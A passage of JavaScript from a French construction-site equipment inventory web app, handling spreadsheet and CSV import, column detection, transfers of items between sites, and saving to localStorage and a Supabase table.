    iNom  = headers.findIndex(h=>h.includes('design')||h.includes('libel')||h.includes('nom')||h.includes('article')||h.includes('materiel'));
    iCat  = headers.findIndex(h=>h.includes('cat')||h.includes('type')||h.includes('famil')||h.includes('group'));
    iEtat = headers.findIndex(h=>h.includes('etat')||h.includes('statut')||h.includes('condit'));
    iDate = headers.findIndex(h=>h.includes('date')||h.includes('verif')||h.includes('echeance')||h.includes('valid'));
    iPrix = headers.findIndex(h=>h.includes('prix')||h.includes('cout')||h.includes('valeur')||h.includes('tarif')||h==='eur'||h==='euro');
    const dbg='Colonnes : nom='+iNom+' ref='+iId+' cat='+iCat+' date='+iDate+' prix='+iPrix;
    console.log('[Import]',dbg,headers);
  } else {
    iNom=0; iId=0; iDate=1; iCat=-1; iEtat=-1; iPrix=-1;
  }

  // Fallback nom → colonne 0
  if(iNom===-1) iNom = iId>=0 ? iId : 0;

  const startRow = hasHeader ? 1 : 0;
  let added=0, skipped=0;
  const updatedIds=new Set();
  const transferes=[];

  for(let i=startRow; i<rows.length; i++){
    const row = rows[i];
    // Nom : colonne désignation OU colonne ref si pas de désignation séparée
    const nom = String(row[iNom]||'').trim();
    if(!nom){skipped++;continue;}

    // Catégorie
    let cat = 'Outillage';
    if(iCat>=0 && row[iCat]){
      cat = String(row[iCat]).trim();
    }

    // ID/Référence : toujours utiliser iId quand disponible, peu importe si c'est la même colonne que nom
    let idRaw = '';
    if(iId>=0 && row[iId]!==undefined && row[iId]!==''){
      idRaw = String(row[iId]).trim().replace(/\s/g,'').replace(/[*\\#?&'"]/g,'-');
    }
    // Fallback si pas de référence : générer depuis nom + index
    if(!idRaw) idRaw = nom.replace(/\s/g,'-').replace(/[^a-zA-Z0-9\-]/g,'').substring(0,20)+'-'+i;
    const id = idRaw || newId('MAT');

    // Échéance (déclarée tôt pour être accessible dans le bloc existingIdx)
    let echeance='';
    if(iDate>=0 && row[iDate]!==undefined && row[iDate]!==''){
      const raw=row[iDate];
      if(typeof raw==='number'&&raw>1000){
        const d=new Date(new Date(1899,11,30).getTime()+raw*86400000);
        echeance=d.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'});
      } else if(raw instanceof Date){
        echeance=raw.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric'});
      } else {
        echeance=String(raw).trim();
      }
    }

    // Vérifier si l'article existe déjà dans ce chantier ou un autre
    const existingInThisC=S.mat.findIndex(m=>m.id===id&&m.chantierId===S.curC);
    const existingInOtherC=S.mat.findIndex(m=>m.id===id&&m.chantierId!==S.curC);

    if(existingInThisC!==-1){
      // Déjà dans ce chantier → juste mettre à jour échéance/prix
      if(echeance) S.mat[existingInThisC].echeance=echeance;
      if(iPrix>=0&&row[iPrix]!==undefined&&row[iPrix]!==''){
        const p=parseFloat(String(row[iPrix]).replace(/[^\d.,]/g,'').replace(',','.'));
        if(!isNaN(p)) S.mat[existingInThisC].prix=p;
      }
      updatedIds.add(id);
      skipped++;continue;
    }

    if(existingInOtherC!==-1){
      // Présent sur un autre chantier → transfert : reset inventaire, garder controle2m
      const ancienChantierNom=getC(S.mat[existingInOtherC].chantierId)?.nom||'chantier inconnu';
      const controle2mSauve=S.mat[existingInOtherC].controle2m||null;
      S.mat[existingInOtherC].chantierId=S.curC;
      S.mat[existingInOtherC].presence='non-confirme';
      S.mat[existingInOtherC].etat='inconnu';
      S.mat[existingInOtherC].scan=null;
      S.mat[existingInOtherC].verifLundi=null;
      S.mat[existingInOtherC].verifSemaine=null;
      S.mat[existingInOtherC].controle2m=controle2mSauve;
      if(echeance) S.mat[existingInOtherC].echeance=echeance;
      // Upsert immédiat — ne pas attendre le batch final
      try{
        const {prix:_p,autreChantier:_a,...matT}=S.mat[existingInOtherC];
        await db.from('materiels').upsert([matT],{onConflict:'id'});
      }catch(e){console.warn('transfert upsert:',e);}
      transferes.push({id, nom, ancienChantierNom});
      skipped++;continue;
    }

    // État
    let etat = 'inconnu';
    if(iEtat>=0 && row[iEtat]){
      const e=norm(row[iEtat]);
      etat=e.includes('bon')?'bon':e.includes('accept')?'acceptable':e.includes('degrad')?'degrade':e.includes('hors')?'hors-service':'inconnu';
    }

    // Prix
    let prix=null;
    if(iPrix>=0&&row[iPrix]!==undefined&&row[iPrix]!==''){
      const p=parseFloat(String(row[iPrix]).replace(/[^\d.,]/g,'').replace(',','.'));
      if(!isNaN(p)) prix=p;
    }

    S.mat.push({id, nom, cat, chantierId:S.curC, etat, scan:null, presence:'non-confirme', echeance, prix});
    added++;
  }

  try{localStorage.setItem('ro3_m',JSON.stringify(S.mat));}catch(e){}
  window._importing=false;
  // Sauvegarder en Supabase APRÈS la fin de l'import (evite blocage)
  const matsToSave=S.mat.filter(m=>m.chantierId===S.curC);
  setTimeout(async()=>{
    for(const mat of matsToSave){
      await saveMat(mat.id);
    }
  },500);
  renderTab();
  const updated=skipped;
  const info=hasHeader?` (ref col.${iId}, nom col.${iNom})`:'';
  toast(added+' ajouté(s)'+(transferes.length?' · '+transferes.length+' transféré(s)':'')+(updated-transferes.length>0?' · '+(updated-transferes.length)+' mis à jour':'')+info,'ok');
  if(transferes.length){
    setTimeout(()=>{
      const existing=document.getElementById('movl');if(existing)existing.remove();
      const div=document.createElement('div');div.id='movl';div.className='moverlay';
      div.innerHTML=`<div class="msheet">
        <div class="mhandle"></div>
        <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">
          <div style="width:40px;height:40px;border-radius:50%;background:rgba(55,138,221,.15);display:flex;align-items:center;justify-content:center;flex-shrink:0">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#85B7EB" stroke-width="2"><polyline points="5 9 2 12 5 15"/><polyline points="9 5 12 2 15 5"/><line x1="2" y1="12" x2="22" y2="12"/><line x1="12" y1="2" x2="12" y2="22"/></svg>
          </div>
          <div>
            <div style="font-size:15px;font-weight:500;color:var(--text)">${transferes.length} article(s) transféré(s)</div>
            <div style="font-size:12px;color:var(--text2);margin-top:2px">Déplacés vers ce chantier · inventaire remis à zéro · contrôle 2 mois conservé</div>
          </div>
        </div>
        <div style="max-height:240px;overflow-y:auto;display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
          ${transferes.map(t=>`<div style="background:rgba(55,138,221,.06);border:.5px solid rgba(55,138,221,.2);border-radius:8px;padding:8px 12px">
            <div style="font-size:13px;font-weight:500;color:var(--text)">${t.nom}</div>
            <div style="font-size:11px;color:#85B7EB;margin-top:2px">← Transféré depuis : ${t.ancienChantierNom}</div>
          </div>`).join('')}
        </div>
        <button onclick="document.getElementById('movl').remove()" class="btn btn-accent">OK</button>
      </div>`;
      document.getElementById('app').appendChild(div);
    },1000);
  }
}


function importCSV(input){
  const file=input.files[0];if(!file){return;}
  const ext=file.name.split('.').pop().toLowerCase();
  input.value='';

  if(ext==='pdf'){toast('Import PDF non supporté','warn');return;}

  const reader=new FileReader();

  if(ext==='xlsx'||ext==='xls'||ext==='xlsm'){
    if(typeof XLSX==='undefined'){toast('Librairie Excel non chargée','danger');return;}
    reader.onload=e=>{
      try{
        const wb=XLSX.read(e.target.result,{type:'array'});
        // Filtrer les onglets utilitaires
        const sheets=wb.SheetNames.filter(sn=>{
          if(SKIP_TABS.includes(sn.toUpperCase().trim())) return false;
          const rows=XLSX.utils.sheet_to_json(wb.Sheets[sn],{header:1,defval:''});
          const ne=rows.filter(r=>r.some(c=>String(c||'').trim()));
          return ne.length>=2;
        });
        if(!sheets.length){toast('Aucune feuille de données trouvée','danger');return;}
        if(sheets.length===1){
          // Feuille unique → comportement classique
          const rows=XLSX.utils.sheet_to_json(wb.Sheets[sheets[0]],{header:1,defval:''});
          processRows(rows.filter(r=>r.some(c=>String(c||'').trim())));
          return;
        }
        // Multi-feuilles → modale de configuration
        const sheetsData=sheets.map(sn=>{
          const rows=XLSX.utils.sheet_to_json(wb.Sheets[sn],{header:1,defval:''});
          const ne=rows.filter(r=>r.some(c=>String(c||'').trim()));
          // Trouver la ligne header (contient "Référence" ou "Reference")
          const headerIdx=ne.findIndex(r=>r.some(c=>/^r[eé]f/i.test(String(c||'').trim())));
          const artCount=headerIdx>=0?ne.slice(headerIdx+1).filter(r=>r[0]&&String(r[0]).trim()&&!/^[📍📦↩]/.test(String(r[0]))).length:0;
          return {sn, rows:ne, headerIdx, artCount};
        });
        openImportMultiModal(sheetsData, file.name);
      }catch(err){toast('Erreur lecture : '+err.message,'danger');}
    };
    reader.onerror=()=>toast('Lecture impossible','danger');
    reader.readAsArrayBuffer(file);
  } else {
    reader.onload=e=>{
      const lines=e.target.result.split(/\r?\n/).filter(l=>l.trim());
      if(!lines.length){toast('Fichier vide','danger');return;}
      const sep=lines[0].includes(';')?';':',';
      processRows(lines.map(l=>l.split(sep).map(c=>c.trim().replace(/^["']|["']$/g,''))));
    };
    reader.onerror=()=>toast('Lecture impossible','danger');
    reader.readAsText(file,'UTF-8');
  }
}

function openImportMultiModal(sheetsData, filename, mode='ajouter'){
  const existing=document.getElementById('movl');if(existing)existing.remove();
  const div=document.createElement('div');div.id='movl';div.className='moverlay';
  const chantiersExistants=S.chantiers.filter(c=>c.statut==='actif'&&!c.parent_id);
  const optExist=chantiersExistants.map(c=>`<option value="exist_${c.id}">${c.nom}</option>`).join('');
  const parentOpts=chantiersExistants.map(c=>`<option value="${c.id}">${c.nom}</option>`).join('');
  // (pas de mémorisation des onglets ignorés — le choix se fait à chaque import)

  // Normalisation pour matching par nom
  const norm=s=>String(s||'').trim().toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g,'');

  const isRemplacer=mode==='remplacer';

  // Pour chaque onglet : trouver automatiquement le chantier existant par nom
  const autoMatch=s=>{
    const snNorm=norm(s.sn);
    return chantiersExistants.find(c=>norm(c.nom)===snNorm||norm(c.nom).includes(snNorm)||snNorm.includes(norm(c.nom)))||null;
  };

  const sheetRows=sheetsData.map(s=>{
    const match=autoMatch(s);
    if(isRemplacer){
